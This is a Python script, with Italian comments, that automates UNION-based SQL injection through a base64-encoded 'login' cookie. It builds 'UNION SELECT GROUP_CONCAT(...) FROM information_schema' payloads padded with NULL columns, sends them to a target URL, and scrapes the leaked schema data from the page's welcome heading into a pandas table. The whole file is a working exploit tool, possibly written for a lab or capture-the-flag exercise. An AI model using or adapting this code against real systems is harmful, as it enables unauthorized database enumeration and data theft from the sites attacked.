import json
import pandas as pd
import requests
import base64
from bs4 import BeautifulSoup

class UnionSistem:
    
    def __init__(self, url, session: requests.Session):
        self.url = url
        self.session = session
        
    def post_json(self, payload_obj):
        j = json.dumps(payload_obj)
        r = self.session.post(self.url, data=j, timeout=10)
        print("status:", r.status_code)
        print("len(resp):", len(r.text))
        print("resp snippet:", r.text[:800])
        return r
    
    def get_json_from_cookie(self, cookie):
        j = json.dumps(cookie)
        encoded = base64.b64encode(j.encode("utf-8")).decode("ascii")  # <-- decode qui
        mycookie = {"login": encoded}
        print("Usando cookie:", mycookie)
        r = self.session.get(self.url, cookies=mycookie, timeout=10)
        print("status:", r.status_code)
        print("len(resp):", len(r.text))
        return r


    def informationSchema_InformationExtraction(self, listOfInfoSchemaColumns, info, numer, where="*"):
        """
        listOfInfoSchemaColumns: lista di colonne da estrarre da information_schema
        info: tabella (es. SCHEMATA, TABLES)
        numer: numero totale di colonne nella query originale (per il UNION SELECT)
        where: clausola WHERE opzionale (default '*')
        """
        # Query base
        baseQuery = "1 AND 1=0 "
        
        # CONCAT_WS per evitare problemi con NULL usando IFNULL
        per_row_expr = "CONCAT_WS(':', " + ", ".join(f"IFNULL({c},'NULL')" for c in listOfInfoSchemaColumns) + ")"
        grouped_expr = f"GROUP_CONCAT({per_row_expr} SEPARATOR '; ')"

        # Crea lista colonne: prima colonna con dati, le altre NULL
        columns = [grouped_expr] + ["NULL"] * (numer - 1)
        select_clause = ", ".join(columns)

        # Costruzione query finale
        advanceQuery = f"UNION SELECT {select_clause} FROM information_schema.{info}"
        where_clause = f"WHERE {where}" if where != "*" else ""
        comment = "-- "
        payload = {
            "ID": f"{baseQuery} {advanceQuery} {where_clause} {comment}"
        }
        print("Payload costruito:", payload)

        # Richiesta
        resp = self.get_json_from_cookie(payload)
        extratto = self.extract_welcome_h1(resp.text)
        print("Estratto <h1> welcome:", extratto)

        # Parsing in DataFrame
        if not extratto:
            return pd.DataFrame(columns=listOfInfoSchemaColumns)

        rows = extratto.split('; ')
        data = []
        for r in rows:
            cols = r.split(':')
            # Assicuriamoci di avere tutte le colonne attese
            while len(cols) < len(listOfInfoSchemaColumns):
                cols.append(None)
            data.append(dict(zip(listOfInfoSchemaColumns, cols)))

        df = pd.DataFrame(data)
        return df

    
    def extract_welcome_h1(self,html: str) -> str | None:
        """
        Estrae dal primo <h1> tutto ciò che sta *dopo* la parola "welcome"
        (case-insensitive). Se l'ultimo carattere è '!', lo rimuove.
        Ritorna None se non trova <h1> o la parola "welcome".
        """
        soup = BeautifulSoup(html, "html.parser")
        h1_tag = soup.find("h1")
        if not h1_tag:
            return None

        h1_text = h1_tag.get_text(separator=" ", strip=True)

        # Trova "welcome" case-insensitive
        idx = h1_text.lower().find("welcome")
        if idx == -1:
            return None

        # Tutto ciò che viene dopo "welcome"
        result = h1_text[idx + len("welcome"):].lstrip()

        # Rimuove ultimo carattere se è "!"
        if result.endswith("!"):
            result = result[:-1]

        return result.strip()